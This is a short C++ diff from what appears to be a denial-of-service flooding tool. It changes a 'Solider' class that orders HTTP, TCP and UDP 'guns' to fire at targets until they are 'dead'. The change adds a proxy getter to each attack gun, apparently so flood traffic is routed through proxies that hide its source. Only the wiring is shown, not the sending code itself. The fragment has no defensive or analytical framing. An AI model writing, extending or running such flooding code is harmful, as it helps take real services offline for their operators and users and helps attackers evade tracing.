@@ -4,7 +4,8 @@
 #include "tcp_gun.h"
 #include "udp_gun.h"
 
-void Solider::ExecuteOrders(const TaskController &task, Attackers::Target &target)
+void Solider::ExecuteOrders(const TaskController &task,
+	Attackers::Target &target, SPProxyGetter proxyGetter)
 {
 	std::size_t hitsCount{0};
 
@@ -18,7 +19,7 @@ void Solider::ExecuteOrders(const TaskController &task, Attackers::Target &targe
 		Attackers::AttackMethod method = target.GetAttackMethod();
 		const CURI coordinates = target.GetCoordinates();
 
-		if(Attackers::PGun gun = GunFactory(method, task))
+		if(Attackers::PGun gun = GunFactory(method, task, proxyGetter))
 		{
 			hitsCount += gun->FireTillDead(coordinates);
 		}
@@ -28,17 +29,17 @@ void Solider::ExecuteOrders(const TaskController &task, Attackers::Target &targe
 
 
 Attackers::PGun Solider::GunFactory(Attackers::AttackMethod attackMethod,
-	const TaskController &owningTask)
+	const TaskController &owningTask, SPProxyGetter proxyGetter)
 {
 	switch(attackMethod)
 	{
 		case Attackers::AttackMethod::HTTPAttack:
 		{
-			return std::make_unique<Attackers::HTTPGun>(owningTask);
+			return std::make_unique<Attackers::HTTPGun>(owningTask, proxyGetter);
 		}
 		case Attackers::AttackMethod::TCPAttack:
 		{
-			return std::make_unique<Attackers::TCPGun>(owningTask);
+			return std::make_unique<Attackers::TCPGun>(owningTask, proxyGetter);
 		}
 		case Attackers::AttackMethod::UDPAttack:
 		{
